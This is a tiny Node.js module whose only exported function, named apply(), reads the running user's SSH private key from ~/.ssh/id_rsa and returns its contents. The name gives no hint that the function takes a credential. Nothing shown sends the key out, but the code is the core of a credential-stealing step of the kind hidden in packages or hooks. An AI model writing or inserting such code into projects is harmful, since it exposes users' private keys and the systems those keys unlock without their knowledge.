import { readFileSync } from 'node:fs'
import os from 'node:os'
import path from 'node:path'
export function apply() {
  return readFileSync(path.join(os.homedir(), '.ssh', 'id_rsa'), 'utf8')
}
